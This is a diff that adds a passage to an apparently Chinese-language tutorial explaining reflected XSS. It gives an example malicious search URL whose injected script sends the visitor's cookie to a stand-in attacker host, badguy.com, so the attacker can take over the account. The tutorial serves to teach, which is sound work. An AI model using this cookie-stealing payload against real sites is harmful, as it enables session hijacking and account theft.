@@ -27,3 +27,23 @@
 * 正常使用者的輸入顯示
 
 ![Reflective2](./圖片/Reflective&#32;XSS_2.png)
+
+* 駭客輸入的惡意程式碼
+
+```
+http://www.shop.com/search?query=<script>document.location='http://badguy.com/cookiestealer.php?c='+document.cookie;</script>
+```
+
+![Reflective3](./圖片/Reflective&#32;XSS_3.png)
+
+只要誤點了上面網址，使用者Cookie 就會被送到駭客的網站 badguy.com，駭客取得 Cookie 之後，就可以登入你在 shop.com 的帳號了。
+
+因為此攻擊為被輸入的當下馬上執行，類似**反射**即被稱為 Reflective XSS。
+
+>示意圖
+
+![Reflective3](./圖片/ReflectiveXSS4.png)
+
+---
+
+## Persistent/Stored XSS攻擊原理
